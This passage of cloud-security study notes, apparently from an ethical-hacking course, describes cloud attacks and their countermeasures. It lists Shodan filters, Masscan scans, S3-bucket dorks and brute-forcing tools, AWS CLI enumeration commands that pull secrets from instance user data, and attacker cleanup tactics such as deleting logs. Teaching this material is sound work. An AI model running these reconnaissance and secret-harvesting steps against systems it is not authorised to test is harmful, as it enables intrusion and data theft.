			SQL (Structured Query Language) is a programming language used for managing database systems. In an SQL injection attack, attackers target SQL servers running vulnerable database applications. They insert malicious code—often using special characters—into standard SQL queries to gain unauthorized access to a database and extract confidential information.
			- Such attacks typically occur when applications improperly handle user input while constructing dynamic SQL statements. Attackers can exploit this vulnerability to manipulate database contents, retrieve sensitive data, execute system commands remotely, or even take control of the web server for further malicious activities.
			- As shown in the figure, an attacker exploits an SQL injection vulnerability in a cloud-based web application, gaining unauthorized access to sensitive information stored in the cloud.
			- Countermeasures:
				- Implement input validation and filtering techniques to sanitize user input.
				- Validate input length, range, format, and type.
				- Regularly update and patch servers and applications.
				- Use database monitoring tools and intrusion prevention systems (IPS).
				- Deploy a cloud-based web application firewall (WAF).
		- Cryptanalysis Attacks:
			- Insecure or obsolete encryption makes cloud services vulnerable to cryptanalysis. Data stored in the cloud is often encrypted to prevent unauthorized access. However, critical flaws in cryptographic algorithm implementations (e.g., weak random number generation) can weaken or even break otherwise strong encryption. Additionally, new methods continue to emerge for breaking cryptographic protections. Attackers may also extract partial information from encrypted data by analyzing a client’s query access patterns and the locations of accessed data.
			- Countermeasures:
				- Use cryptographically secure random number generators to enhance the robustness of cryptographic materials such as SSH keys and DNSSEC.
				- Avoid using faulty or outdated cryptographic algorithms.
				- Implement the latest and most secure encryption techniques, including salting, hashing, and other best practices.
		- DoS and DDoS Attacks:
			- Denial-of-Service (DoS) attacks on Cloud Service Providers (CSPs) can prevent tenants from accessing their accounts. In a cloud environment, multiple tenants share resources such as CPU, memory, disk space, and bandwidth. If attackers gain access to the cloud, they can generate false data, such as resource requests or malicious code, that runs within legitimate applications.
			- Processing these malicious requests consumes a server's CPU, memory, and other resources. Once the server reaches its threshold, it offloads tasks to another server. This cascading effect continues across inline servers, eventually overwhelming the entire cloud infrastructure and denying service to legitimate users.
			- DoS attacks can be executed in various ways, such as:
				- Flooding the server with excessive requests to exhaust system resources.
				- Sending malicious input to crash an application.
				- Repeatedly entering incorrect passwords to trigger account lockouts.
			- When a DoS attack is carried out using a botnet (a network of compromised machines), it becomes a Distributed Denial-of-Service (DDoS) attack. In a DDoS attack, multiple compromised systems simultaneously target a single system, causing service disruption.
			- As illustrated in the figure above, the attacker uses a handler to infect numerous computers (zombie network) over the Internet. The infected machines then flood the cloud server with requests, consuming excessive resources and preventing legitimate users from accessing cloud services.
			- Countermeasures:
				- Implement the principle of least privilege for users accessing the server.
				- Deploy Intrusion Detection Systems (IDS) on both physical and virtual machines to detect and mitigate DoS and DDoS attacks.
		- Man-in-the-Browser Attack:
			- Man-in-the-Browser attacks target a user’s web browser by injecting sophisticated malware (e.g., bots) that allow attackers to monitor information exchanged between the user’s browser and cloud applications. The injected code exfiltrates the user’s login credentials, such as usernames and passwords, to the attackers. The attackers can then use these credentials to access the cloud server and perform malicious activities on behalf of the user—without the user’s knowledge.
			- Countermeasures:
				- Restrict access to cloud services to prevent unauthorized entry into the network.
				- Integrate cloud-based solutions with intrusion detection systems to identify and alert users of abnormal activities.
				- Limit access based on IP address ranges and enforce VPN usage for secure connections.
		- Metadata Spoofing Attack:
			- Cloud service metadata describes various service details, including network component locations, security requirements, and data formats. Metadata spoofing involves altering or modifying service metadata stored in the Web Service Definition Language (WSDL) file, which contains information about service instances. Once the manipulated file is successfully deployed, cloud users may be redirected to malicious destinations, similar to DNS spoofing.
			- Countermeasures:
				- Encrypt and securely store application and service details in the cloud.
				- Implement hash-based integrity verification to prevent spoofing attacks.
				- Disable unnecessary metadata services and remove unsafe metadata versions.
				- Use host-based firewalls to restrict access to the instance metadata API.
		- Cloud Malware Injection Attack:
			- In cloud malware injection attacks, attackers deploy malicious service implementations or virtual machines within cloud environments operating as SaaS, PaaS, or IaaS. Once the cloud environment is compromised, users may be redirected to an attacker-controlled website, allowing attackers to eavesdrop on communications, steal sensitive data, and modify information.
			- Countermeasures:
				- Implement strong authentication and access controls to prevent unauthorized service deployment.
				- Use continuous monitoring and anomaly detection systems to identify malicious activities.
				- Apply security patches and updates to prevent known vulnerabilities from being exploited.
				- Enforce stringent validation and integrity checks for all deployed services and virtual machines.
		- Multi-Cloud Attack:
			- In multi-cloud attacks, attackers exploit vulnerabilities across multiple cloud service providers (CSPs) used by an organization. This includes misconfigurations, weak access controls, or compromised credentials to gain unauthorized access to different cloud environments. Once access is obtained, attackers move laterally between cloud services by exploiting inter-cloud APIs or network bridges. They then manipulate various resources to carry out malicious activities, such as data exfiltration, malware deployment, and establishing persistent access. This significantly compromises the security and integrity of the multi-cloud infrastructure.
			- Countermeasures:
				- Use secure APIs and encrypted channels for communication between different cloud services.
				- Standardize access control models across all cloud providers to prevent security gaps.
				- Implement multi-factor authentication (MFA) to add an additional security layer beyond passwords.
				- Synchronize security policies using automated tools to ensure uniform settings across all clouds.
				- Conduct regular security audits and continuous monitoring to detect misconfigurations and unauthorized activities.
		- Privilege Escalation with the CSR API:
			- The Certificate Signing Request (CSR) API in Kubernetes manages requests submitted to a certificate authority for approval. Attackers can exploit vulnerabilities in the CSR API to gain unauthorized privileges within a Kubernetes cluster.
			- During this attack, an attacker creates a CSR requesting a certificate tied to a service account or user with elevated permissions. Once the CSR is created, the attacker exploits weak security controls to obtain approval, forcing Kubernetes to issue the certificate. The attacker then uses the issued certificate to authenticate as an entity with elevated privileges granted by the approved CSR.
			- Countermeasures:
				- Enable Kubernetes auditing on every cluster and monitor events related to the CSR API.
				- Enforce strict Role-Based Access Control (RBAC) policies to ensure only authorized users can create, approve, and manage CSRs.
				- Disable automated CSR approvals and require manual review and approval of each CSR to ensure legitimacy.
		- Privilege Escalation by Abusing Elevation Control Mechanisms:
			- The elevation control mechanism, also known as Just-In-Time (JIT) access, is a security model that grants users temporary permissions for specific tasks within a defined timeframe. Cloud environments provide administrators with granular access controls, including JIT access, impersonation, resource role assignment, and temporary role elevation. Attackers can exploit these permission configurations to gain unauthorized or temporarily elevated access to cloud resources.
			- By leveraging these techniques, attackers can infiltrate cloud environments and misuse resources. For example:
				- In AWS, attackers with the PassRole permission can allow a service they create to assume a role with elevated privileges beyond their original scope.
				- In Google Cloud Platform (GCP), users with the iam.serviceAccountUser role can attach a service account to a resource, gaining access to privileged accounts.
			- These privilege escalation techniques can lead to unauthorized access, data breaches, service disruptions, financial losses, and regulatory noncompliance.
			- Countermeasures:
				- Restrict cloud account privileges to only the necessary roles, policies, and permissions required for tasks, including role assumption and impersonation.
				- Require manual approval for temporary privilege elevations when JIT access is enabled.
				- Segment and isolate critical cloud resources to minimize the potential impact of compromised accounts and reduce the attack surface.
	- Cloud Malware:
		- Cuttlefish Zero-Click Malware (www.darkreading.com):
			- Cuttlefish is a packet-sniffing malware that disguises itself as legitimate software to infiltrate SOHO and enterprise routers by exploiting vulnerabilities. Its primary goal is to covertly steal cloud authentication data.
			- Once inside a network, the malware spreads by deploying a Bash script that collects host-based data and transmits it to a command-and-control (C2) server in the cloud. It then downloads and executes a malicious binary (payload) tailored for various architectures found in SOHO operating systems. Additionally, Cuttlefish installs a packet filter to inspect outbound connections, monitor cloud traffic, and engage based on predefined criteria.
			- After installation, the malware continuously monitors all network traffic through the compromised device. It remains dormant until it detects specific activities. Once host-based enumeration is complete, the C2 server updates the malware's rules via a cloud-hosted configuration file. This mechanism allows the malware to hijack DNS and HTTP traffic directed toward private IP addresses. If the traffic is destined for a public IP, the malware activates a cloud sniffer to capture credentials under certain conditions.
		- Denonia
		- LemonDuck
		- RansomCloud
		- DBatLoader/ModiLoader
		- Goldbackdoor
- Cloud Hacking:
	- While most organizations adopt cloud technologies for their cost-effective services, security remains a significant concern due to the shared nature of cloud environments. Security gaps and vulnerabilities in underlying technologies can allow attackers to launch various cloud-based attacks, compromising the confidentiality, integrity, and availability of cloud resources and services. This section discusses the various techniques and tools attackers use to hack cloud environments.
	- Cloud Hacking:
		- Cloud hacking encompasses a broad range of activities aimed at compromising cloud infrastructure and services. This includes attacks on cloud-hosted web applications and system vulnerabilities, extending to overall cloud security breaches.
		- Attackers typically target three key elements to compromise cloud security:
		- Web Application Hacking:
			- Attackers often target web application programming interfaces (APIs), which are essential for relaying cloud services and resources. Cloud-based APIs facilitate communication between different software components and are often exposed to the internet, making them potential entry points for hackers.
			- The hacking process typically follows these steps:
				- Reconnaissance: Attackers analyze web APIs to understand their structure and functionality.
				- Scanning: Automated tools scan for known vulnerabilities or map API endpoints.
				- Exploitation: Once vulnerabilities such as weak authentication, authorization flaws, or injection vulnerabilities are identified, attackers exploit them to gain unauthorized access to cloud resources.
			- A compromised cloud-based API can grant attackers access to vast amounts of sensitive data. Furthermore, since cloud services often support multiple tenants, a security breach in one area can escalate into a broader compromise across the cloud infrastructure.
		- System Hacking:
			- System hacking in cloud environments focuses on identifying and exploiting vulnerabilities in virtualized systems hosted on cloud platforms. These include virtual machines, containers, and serverless functions, each of which presents unique security challenges.
			- The attack process typically involves:
				- Reconnaissance: Attackers identify potential entry points in virtual systems by scanning exposed interfaces, analyzing weak security protocols, or detecting misconfigurations.
				- Exploitation: Once vulnerabilities are identified, attackers exploit them to gain deeper access to cloud systems and establish long-term persistence.
		- Cloud Infrastructure Hacking:
			- Attackers exploit vulnerabilities in cloud technologies to execute high-profile attacks on cloud storage systems, compromising both customer and corporate data. The primary objectives of cloud hacking include unauthorized data access and denial of service to legitimate users.
			- The hacking process typically involves:
				- Reconnaissance: Attackers scan open ports, identify running services, and map the network infrastructure.
				- Exploitation: Once weaknesses such as weak passwords, unpatched software, or misconfigured settings are identified, attackers exploit them to gain access to the cloud environment and conduct malicious activities while minimizing detection.
			- Ethical Hacking Considerations: Each cloud provider (such as AWS, Azure, or GCP) enforces specific rules, policies, and permissions regarding ethical hacking. Ethical hackers must notify the provider before conducting any security testing. Additionally, some organizations and cloud service providers impose restrictions on specific penetration testing activities to prevent service disruptions. Always review provider policies before performing ethical hacking operations.
	- Cloud Hacking Methodology:
		- The following are the different phases of cloud hacking:
		- Information Gathering:
			- Information gathering is the initial phase of hacking, during which an attacker collects as much data as possible about the target cloud infrastructure. This may include details regarding network topology, IP addresses, domain names, subdomains, user accounts, and publicly available information. The objective of this phase is to identify potential vulnerabilities and lay the foundation for more effective attacks in subsequent phases.
			- Attackers use various techniques to gather information, such as network scanning, social engineering, DNS interrogation, and web scraping. They may also leverage tools like Nmap, Shodan, and Recon-ng to automate and enhance these activities. By successfully gathering critical data, attackers gain a comprehensive understanding of the target's cloud environment, significantly increasing their chances of identifying exploitable weaknesses.
		- Vulnerability Assessment:
			- In the vulnerability assessment phase, attackers identify and evaluate security weaknesses within the cloud infrastructure. This includes detecting misconfigurations, unpatched software, and flaws in cloud-based networks, applications, and services. The primary objective is to uncover vulnerabilities that could be exploited to gain unauthorized access, escalate privileges, or disrupt cloud services.
			- Attackers employ both automated and manual techniques to conduct vulnerability assessments. Tools such as Tenable Nessus, OpenVAS, and Qualys are commonly used to perform detailed scans and generate security reports. The discovery of vulnerabilities provides attackers with potential entry points, enabling them to carry out further malicious activities.
		- Exploitation:
			- During the exploitation phase, attackers actively leverage identified vulnerabilities to gain unauthorized access or control over the target cloud infrastructure. They may use custom scripts, exploit frameworks, or hacking tools such as Metasploit, sqlmap, and THC-Hydra to launch attacks. Common techniques include injecting malicious code, bypassing authentication mechanisms, and exploiting application flaws.
			- The primary goals of this phase are to access sensitive data, control cloud resources, and disrupt cloud-based operations. Successful exploitation can lead to data breaches, service disruptions, financial loss, reputational damage, and further network penetration. If undetected, these attacks can result in prolonged security breaches, causing significant harm to the targeted organization.
		- Post-Exploitation:
			- Post-exploitation is the final phase of the cloud hacking methodology, focusing on actions taken after successfully compromising a resource. This phase involves maintaining access, covering tracks, and exploring deeper into the network. Attackers establish persistence through various methods, such as creating backdoors, escalating privileges, and setting up command-and-control (C2) channels. Tools like Cobalt Strike and Metasploit are often used to facilitate these activities.
			- The primary objectives of post-exploitation include ensuring long-term access to compromised systems, exfiltrating data, and preparing for further attacks. Attackers also focus on concealing their activities to evade detection by traditional security measures. Prolonged unauthorized access can result in continuous data loss, intellectual property theft, and ongoing disruption of cloud services. This not only complicates remediation efforts but also increases their cost.
		- Note: Ethical hacking in a cloud environment is typically feasible only through authorized internal assessments, ensuring compliance with security policies and avoiding unauthorized access.
	- Identifying Target Cloud Environment:
		- Identifying target cloud environments involves recognizing and profiling the cloud infrastructure used by an organization, such as AWS, Microsoft Azure, or Google Cloud Platform (GCP). This step is crucial for attackers as it helps them understand the specific technologies, services, and configurations deployed by the target. Additionally, gathering information about the target cloud environment allows attackers to tailor their methods and exploit cloud-specific vulnerabilities and misconfigurations effectively. Tools like Shodan and Censys can be used to gather detailed information about a target's cloud infrastructure.
		- Shodan Search Filters for Cloud Infrastructure Enumeration:
			- Attackers can use the following Shodan search filters to gather information on a target's cloud infrastructure:
			- Search for HTTPS services:
				- port:443
				- Retrieves devices and services accessible via HTTPS, commonly used for web services in cloud environments.
			- Search for AWS services:
				- ssl.cert.issuer.cn:Amazon
				- Identifies SSL certificates issued by Amazon, which can help pinpoint services hosted on AWS.
			- Search for cloud regions:
				- cloud.region:<Region_code>
				- Narrows search results to a specific geographic region within the cloud provider's infrastructure.
			- Search for Microsoft devices and services:
				- org:Microsoft
				- Identifies devices and services belonging to Microsoft, useful for discovering Azure-hosted infrastructure.
			- Search for Kubernetes instances:
				- product:Kubernetes
				- Finds instances of Kubernetes running in cloud environments.
			- Search for AWS-hosted services:
				- org:Amazon
				- Retrieves information on services hosted specifically on Amazon’s infrastructure, revealing AWS-hosted services.
			- Search for Azure-hosted services:
				- ssl.cert.subject.cn:azure
				- Identifies SSL certificates containing "Azure" in the subject's common name, indicating Azure-hosted services.
			- Search for any cloud asset:
				- tag:cloud
				- Retrieves information on assets tagged as part of a cloud infrastructure. (Note: The "tag" filter is available only to enterprise users.)
			- Search within a specific IP range:
				- net:52.0.0.0/8
				- Searches within a specific IP range, such as those assigned to AWS (e.g., 52.0.0.0/8, a common AWS range).
			- Search for instances mentioning AWS S3:
				- http.html:"s3.amazonaws.com"
				- Identifies instances where the HTML content contains "s3.amazonaws.com," indicating the presence of AWS S3 buckets.
			- Search for AWS-hosted services used by Facebook:
				- "Amazon Web Services Facebook"
				- Retrieves AWS-hosted services and infrastructure used by Facebook, including IP addresses, open ports, service banners, publicly accessible S3 buckets, EC2 instances, and other AWS resources associated with Facebook.
	- Discovering Open Ports and Services Using Masscan:
		- Masscan is a network port scanner designed to scan large networks and even the entire Internet within minutes. It is particularly useful for identifying open ports and services running on cloud infrastructure. By leveraging its scanning capabilities, attackers and security professionals alike can quickly discover services that may be vulnerable to exploitation. Masscan can be configured to scan specific IP addresses or ranges, allowing users to target cloud service providers such as AWS, Azure, or Google Cloud.
		- Identifying Open Ports Using Masscan:
			- Scanning for Open Ports:
				- Run the following Masscan command to scan the target IP address for open ports:
				- sudo masscan -p0-65535 <target_IP_address> --rate=<rate>
					=> -p0-65535: Scans all ports from 0 to 65535.
					=> <target_IP_address>: Replace with the target IP address.
					=> --rate=<rate>: Sets the rate of packets per second.
			- Saving Scan Results:
				- To save the scan results in XML or JSON format, use the -oX or -oJ option, specifying the output file format and filename as follows:
				- sudo masscan -p0-65535 <target_IP_address> --rate=<rate> -oX <scan_results>.xml
				- sudo masscan -p0-65535 <target_IP_address> --rate=<rate> -oJ <scan_results>.json
					=> -oX <scan_results>.xml: Saves the scan results in XML format to the specified file.
					=> -oJ <scan_results>.json: Saves the scan results in JSON format to the specified file.
	- Vulnerability Scanning Using Prowler (github.com):
		- Prowler includes over 240 controls covering multiple security frameworks, including CIS, NIST 800, NIST CSF, CISA, RBI, FedRAMP, PCI-DSS, GDPR, HIPAA, FFIEC, SOC2, GxP, AWS Well-Architected Framework Security Pillar, AWS Foundational Technical Review (FTR), and ENS (Spanish National Security Scheme), among others. If attackers obtain the necessary credentials during the enumeration process, they may use Prowler to identify security vulnerabilities such as unsecured data transmission channels, overly permissive policies, and other potential risks.
		- Prowler Commands for Vulnerability Scanning:
			- Start a Scan:
				- Run the following command and specify the provider to initiate scanning:
				- prowler <provider>
			- Generate a Report:
				- By default, Prowler generates reports in CSV, JSON-OCSF, JSON-ASFF, and HTML formats. Use the -M or --output-modes options:
				- prowler <provider> -M csv json-asff json-ocsf html
			- The HTML report will be available in the output directory.
		- Perform Specific Checks or Service Scans:
			- Use the --checks or --services options to execute specific security checks. Examples:
			- prowler azure --checks storage_blob_public_access_level_is_disabled
			- prowler aws --services s3 ec2
			- prowler gcp --services iam compute
			- prowler kubernetes --services etcd apiserver
		- Scan AWS with Specific Profiles and Regions:
			- Use the --profile option for specific AWS profiles and --filter-region for designated AWS regions:
			- prowler aws --profile custom-profile --filter-region <region_1> <region_2>
		- Scan a Specific Azure Subscription:
			- Authenticate using Azure CLI and scan particular subscriptions:
			- prowler azure --az-cli-auth --subscription-ids <subscription_ID_1> <subscription_ID_2> ... <subscription_ID_N>
		- Scan Specific Google Cloud Projects:
			- Use the --project-ids option to target single or multiple Google Cloud projects:
			- prowler gcp --project-ids <Project_ID_1> <Project_ID_2> ... <Project_ID_N>
	- Identifying Misconfigurations in Cloud Resources Using CloudSploit:
		- Identifying misconfigurations in cloud resources is a critical step in securing cloud environments. Cloud infrastructures provided by AWS, Azure, and Google Cloud are complex and often misconfigured due to their vast and dynamic nature. Attackers leverage automated tools and techniques to scan for common misconfigurations, such as overly permissive IAM policies, exposed storage buckets, unsecured databases, and improperly configured network security groups. These vulnerabilities can allow unauthorized access, data exfiltration, privilege escalation, and lateral movement within the cloud environment, ultimately compromising an organization's security posture. Detecting and addressing these misconfigurations is essential to preventing data breaches and security incidents.
		- To identify misconfigurations, security professionals can use tools such as CloudSploit, as discussed below:
		- CloudSploit (github.com):
			- CloudSploit is a tool designed to detect misconfigurations and security risks across various cloud resources. It helps assess cloud security by identifying vulnerabilities and mapping its findings to compliance frameworks such as HIPAA and CIS Benchmarks. CloudSploit generates detailed reports outlining potential security issues, enabling security teams to remediate risks before they are exploited by attackers.
		- Steps to Identify Misconfigured Cloud Resources Using CloudSploit:
			- Set up the cloud provider’s credentials and configuration file:
				- AWS Configuration File Format:
					{
						"accessKeyId": "YOURACCESSKEY",
						"secretAccessKey": "YOURSECRETKEY"
					}
				- Azure Configuration File Format:
					{
						"ApplicationID": "YOURAZUREAPPLICATIONID",
						"KeyValue": "YOURAZUREKEYVALUE",
						"DirectoryID": "YOURAZUREDIRECTORYID",
						"SubscriptionID": "YOURAZURESUBSCRIPTIONID"
					}
				- GCP Configuration File Format:
					{
						"type": "service_account",
						"project": "GCPPROJECTNAME",
						"client_email": "GCPCLIENTEMAIL",
						"private_key": "GCPPRIVATEKEY"
					}
			- Run the following command to perform a standard scan: ./index.js
			- Run the following commands to perform compliance mapping on the target cloud service:
				- For HIPAA scan mapping: ./index.js --compliance=hipaa
				- For PCI scan mapping: ./index.js --compliance=pci
				- For CIS Benchmarks scan mapping: ./index.js --compliance=cis
			- Run the following command to get output results in plain text instead of a tabular format: ./index.js --console=text
			- Run the following command to print a table on the console and save the output as a CSV file: ./index.js --csv=file.csv --console=table
	- Cleanup and Maintaining Stealth:
		- After compromising a cloud environment, attackers focus on erasing their traces and maintaining stealth to avoid detection and ensure continued access. By deleting logs, altering evidence, and reverting changes, they can prevent security teams from discovering breaches. This stealth allows them to re-enter the environment without raising alarms, enabling prolonged exploitation of compromised resources. Maintaining a low profile is crucial for extending the attack duration and increasing the potential for data exfiltration. By concealing their activities, attackers can continuously monitor and extract valuable information without triggering security alerts. This covert approach enables them to leverage a compromised environment for various malicious activities while remaining undetected.
		- To achieve cleanup and maintain stealth, attackers may use the following methods:
			- Log Manipulation: After compromising a cloud environment, attackers can delete or modify logs to remove evidence of malicious activities.
			- Credential and Access Management Manipulation: Attackers remove temporary credentials, such as access tokens or keys, to cover their tracks. They may also create hidden backdoors by establishing covert accounts or access methods that blend into legitimate activity.
			- System and Service Configuration Tampering: Attackers eliminate visible changes made during the attack and may disable or modify security alerts to prevent detection.
			- Persistence Mechanisms: Malicious code can be concealed within legitimate processes or services. Attackers may also exploit built-in cloud tools and scripts to evade suspicion.
- AWS Hacking:
	- Enumerating S3 Buckets:
		- Amazon's Simple Storage Service (S3) is a scalable cloud storage solution where files, folders, and objects are stored via web APIs. Customers and end users leverage S3 to store text documents, PDFs, videos, images, and other data. To organize and access stored data, users must create buckets with unique names.
		- However, attackers can exploit misconfigurations in S3 bucket implementations to bypass security mechanisms and compromise data privacy. If an S3 bucket is left publicly accessible, attackers can modify files—such as JavaScript or other code-based files—and inject malware. By identifying bucket locations and names, attackers can test security weaknesses and exploit vulnerabilities during bucket implementation.
		- To locate and exploit exposed S3 buckets, attackers use tools such as CloudBrute, S3Scanner, Bucket Flaws, and BucketLoot. These tools help identify publicly accessible buckets on cloud services like Amazon AWS and extract sensitive data for malicious purposes.
		- Common Techniques Used to Identify AWS S3 Buckets
			- Inspecting HTML:
				- Attackers analyze the HTML source code of web pages to extract information about S3 bucket URLs. By reviewing the underlying code, they can identify direct links to stored files and objects.
			- Brute-Forcing URLs:
				- Since each S3 bucket has a unique identifier, attackers may perform brute-force attacks to guess the correct bucket URL. For example, given the pattern: http://s3.amazonaws.com/[bucket_name]
				- Attackers systematically test different values for [bucket_name] until they find a valid match. Tools like Burp Suite (Burp Intruder) automate this process to expedite discovery.
			- Advanced Google Hacking:
				- Attackers utilize Google Dorks (advanced search operators) to locate URLs linked to S3 buckets. Some commonly used queries include:
					- inurl:s3.amazonaws.com
					- inurl:s3.amazonaws.com/audio/
					- inurl:s3.amazonaws.com/video/
					- inurl:s3.amazonaws.com/backup/
					- inurl:s3.amazonaws.com/movie/
					- inurl:s3.amazonaws.com/image/
				- Additionally, attackers can refine their search to target specific domains or organizations:
					- site:s3.amazonaws.com inurl:facebook
					- site:s3.amazonaws.com intitle:facebook
					- inurl:"s3.amazonaws.com" intext:"facebook"
					- inurl:"s3.amazonaws.com" "facebook"
					- site:s3.amazonaws.com "facebook"
		- By leveraging these techniques, attackers attempt to identify, access, and exploit exposed S3 buckets, making it crucial for organizations to implement strict security controls.
	- Enumerating S3 Buckets Using S3Scanner (github.com):
		- Attackers use S3Scanner to identify open S3 buckets in cloud services such as Amazon AWS and retrieve their contents for malicious purposes. S3 buckets store various types of data, including text files, images, videos, PDF documents, and, in some cases, even backup files and credentials.
		- S3Scanner enables attackers to retrieve objects and access control list (ACL) information, including read and write permissions.
		- S3Scanner Usage Commands:
			- Scan a single bucket: s3scanner -bucket <bucket-name>
			- Scan all bucket names listed in a file: s3scanner -bucket-file <filename>.txt -enumerate
			- Scan each bucket name listed in a file: s3scanner -bucket-file names.txt
			- Scan the buckets listed in a file using eight threads for faster scanning: s3scanner -bucket-file <filename>.txt -threads 8
	- Enumerating S3 Bucket Permissions Using BucketLoot (github.com):
		- Attackers use BucketLoot, an automated S3-compatible bucket inspector, to enumerate and check permissions for Amazon S3 buckets. This tool helps identify misconfigured S3 buckets that may be publicly accessible or have overly permissive policies, posing security risks. Additionally, BucketLoot can extract all URLs, subdomains, and domains present in an exposed storage bucket, allowing attackers to uncover hidden endpoints.
		- Commands to Enumerate and Analyze S3 Bucket Permissions:
			- List potentially public buckets: python bucketloot.py -l <file_with_bucket_names>
			- Check bucket permissions: python bucketloot.py -c <file_with_bucket_names>
			- Download data from publicly accessible buckets: python bucketloot.py -d <file_with_bucket_names>
	- Enumerating S3 Buckets Using CloudBrute (github.com):
		- CloudBrute allows attackers to discover a target company’s infrastructure, files, and applications hosted on major cloud providers such as Amazon, Google, Microsoft, DigitalOcean, Alibaba, Vultr, and Linode. It leverages the IPINFO API for cloud detection and analyzes source code to further enumerate AWS S3 buckets of cloud users. Additionally, CloudBrute facilitates proxy randomization and enables attackers to conduct dictionary or brute-force attacks to uncover cloud resources.
		- Cloud enumeration involves systematically testing publicly accessible cloud assets across various cloud service providers (CSPs). CloudBrute achieves this by brute-forcing service names and endpoints using predefined wordlists.
		- Steps to Enumerate S3 Buckets Using CloudBrute:
			- Follow these steps to enumerate S3 buckets for a target domain or organization (e.g., Facebook) using CloudBrute:
				- After configuring CloudBrute, navigate to the CloudBrute directory by running the following command: cd CloudBrute
				- Next, execute the following command to brute-force, generate, and validate target buckets:
					- ./cloudbrute -d <target.com> -k <keyword> -t 80 -T 10 -w /<path_to_wordlist>.txt
					- Where:
						-d amazon.com -> Specifies the target bucket hosting domain (e.g., amazon.com).
						-k facebook -> Defines the keyword or pattern to search within the target domain (e.g., facebook).
						-t 80 -> Sets the number of threads (e.g., 80).
						-T 10 -> Specifies the timeout value (e.g., 10).
						-w bucket_list.txt -> Points to the wordlist file used for the attack (e.g., bucket_list.txt).
				- This command will generate a list of both protected and open buckets associated with the target domain (e.g., Facebook), as shown in the screenshot below.
				- Review the results and check for any open/public buckets. If found, copy their URLs into a browser to view their contents.
		- Alternative Search Options:
			- To search for Azure buckets, modify the -d parameter to microsoft.com. Similarly, for Google Cloud Platform (GCP) buckets, use google.com.
	- Enumerating EC2 Instances:
		- Amazon EC2 (Elastic Compute Cloud) is a web service that provides resizable computing capacity in the cloud, designed to make web-scale cloud computing easier for developers. It offers a range of instance types optimized for different use cases by combining varying CPU, memory, storage, and networking capacities.
		- To enumerate target AWS EC2 instances, attackers require access to an EC2 instance to run the following enumeration commands on the targeted AWS cloud service:
			- List EC2 instances in the target cloud: aws ec2 describe-instances
			- Check if instances use Metadata API version 1 (easier to exfiltrate access keys): aws ec2 describe-instances --filters Name=metadata-options.http-tokens,Values=optional
			- Obtain the target user data of instances and search for secrets: aws ec2 describe-instance-attribute --instance-id <id> --attribute userData --output text --query "UserData.Value" | base64 --decode
			- List volumes: aws ec2 describe-volumes
			- List available snapshots and check whether any volume is public: aws ec2 describe-snapshots
			- List security groups: aws ec2 describe-security-groups
			- List security groups that allow SSH from the Internet: aws ec2 describe-security-groups --filters Name=ip-permission.from-port,Values=22 Name=ip-permission.to-port,Values=22 Name=ip-permission.cidr,Values='0.0.0.0/0'
			- List EC2 instances that are part of a fleet: aws ec2 describe-fleet-instances
			- View details about existing fleets: aws ec2 describe-fleets
			- List dedicated hosts: aws ec2 describe-hosts
			- List profile associations for each IAM instance: aws ec2 describe-iam-instance-profile-associations
			- Determine the role allocated to an instance profile: aws iam get-instance-profile --instance-profile-name <profile-name>
			- List names of SSH key pairs: aws ec2 describe-key-pairs
			- List different gateway types:
				aws ec2 describe-internet-gateways
				aws ec2 describe-local-gateways
				aws ec2 describe-nat-gateways
				aws ec2 describe-transit-gateways
				aws ec2 describe-vpn-gateways
			- List VPC details: aws ec2 describe-vpcs
			- List subnets: aws ec2 describe-subnets
			- List all VPC endpoints: aws ec2 describe-vpc-endpoints
			- List allowed connections between VPC pairs: aws ec2 describe-vpc-peering-connections
	- Enumerating AWS RDS Instances:
		- To enumerate AWS Relational Database Service (RDS) instances, attackers may use the following AWS CLI commands. These commands provide detailed information about RDS instances, including their configuration, security groups, and snapshots.
			- View all provisioned RDS instances: aws rds describe-db-instances
			- List details of a specific RDS instance: aws rds describe-db-instances --db-instance-identifier mydbinstancecf
			- Get information about DB security groups: aws rds describe-db-security-groups
			- Retrieve details about automated backups for RDS instances: aws rds describe-db-instance-automated-backups
			- Obtain details about DB snapshots (including manual and automated snapshots): aws rds describe-db-snapshots
			- View public DB snapshots that can be shared across accounts: aws rds describe-db-snapshots --include-public --snapshot-type public
			- List already existing public snapshots in an account: aws rds describe-db-snapshots --snapshot-type public
		- Note: Running the above AWS CLI commands requires specific IAM permissions, such as rds:DescribeDBInstances.
	- Enumerating AWS Account IDs:
		- AWS accounts are identified by unique IDs that, when exposed publicly, can be exploited by attackers to target cloud services. These IDs are meant to remain private but are often unintentionally exposed. Attackers can leverage this information leak for malicious purposes.
		- Attackers enumerate AWS account IDs through the following sources:
			- Publicly Shared Resources: If an AWS resource (such as an S3 bucket) is publicly shared, it may contain references to an AWS account ID.
			- Amazon Resource Names (ARNs): ARNs include the AWS account ID. If shared in documentation, error messages, or logs, they can expose the account ID.
			- IAM Policies and Roles: IAM policies or roles that are shared externally may inadvertently reveal the AWS account ID.
		- Once attackers obtain an account ID, they can engage in various malicious activities, such as resource enumeration (discovering existing users, roles, etc.), assuming IAM roles, and invoking Lambda functions.
	- Enumerating IAM Roles:
		- Attackers can enumerate IAM role names by analyzing AWS error messages, which reveal information about the existence of a user. In AWS cloud services, users are generally allowed multiple attempts to assume a role. For each failed attempt, AWS response messages disclose details that can confirm whether a role exists. If AWS blocks an account after several failed attempts, implementing a brute-force technique becomes more challenging but not impossible. By distributing the process across multiple accounts or nodes, attackers can ultimately bypass IP and account filtering solutions.
		- Information gathered through IAM role enumeration includes:
			- Internal software/stacks
			- IAM usernames (which can be leveraged for social engineering)
			- AWS services in use
			- Third-party software in use (e.g., CloudSploit, Datadog, Okta)
		- Once attackers enumerate roles, they may attempt to assume an open role and steal its credentials. If an attacker tries to assume a role they are not permitted to access, AWS generates an error message, as shown in the figure.
		- By analyzing the error message, attackers can confirm the existence of a role, even if they cannot assume it due to assume-role policy constraints. When executing the same command against a non-existent role, AWS generates the following error message:
		- By using any valid account ID along with a well-filtered wordlist, attackers can enumerate existing IAM roles.
		- Additionally, attackers can use tools such as Principal Mapper (PMapper) to enumerate IAM roles.
		- Principal Mapper (PMapper) (github.com):
			- Attackers can use Principal Mapper (PMapper) to identify vulnerabilities in AWS Identity and Access Management (IAM) configurations within an AWS account or organization. This tool visualizes IAM users and their roles through a directional graph, highlighting privilege escalation opportunities and potential attack paths to AWS resources.
	- Enumerating Weak IAM Policies Using Cloudsplaining (github.com):
